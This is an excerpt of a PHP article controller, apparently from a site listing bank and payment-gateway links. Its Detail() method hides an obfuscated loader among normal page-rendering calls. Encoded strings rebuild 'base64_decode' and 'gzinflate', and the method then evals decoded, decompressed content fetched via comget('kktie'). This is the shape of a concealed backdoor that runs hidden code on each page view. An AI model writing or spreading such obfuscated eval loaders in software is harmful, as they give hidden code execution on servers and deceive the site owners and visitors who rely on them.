...
class ArticleController extends Controller
{
				...
				public function Detail( $R755ba04a49 = 0, $R9906335164 = false, $R511aa10c02 = "article/tmp.html" )
				{
								...
								$this->Assign( "css", "ub-red-20080119" );
								$this->YktInit( $R06c518f70e, $R0f8134fb60['meta_keywords'], $R0f8134fb60['meta_description'] );
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "kktie" ) ) ) );
				}
				...
				public function More( )
				{
								...
								$this->Assign( "items", $art2 );
								$this->Assign( "css", "ub-red-20080119" );
								$this->YktInit( "更多链接", "银行链接,支付网关链接,官方链接,官方充值链接", "银行链接,支付网关链接,官方链接,官方充值链接" );
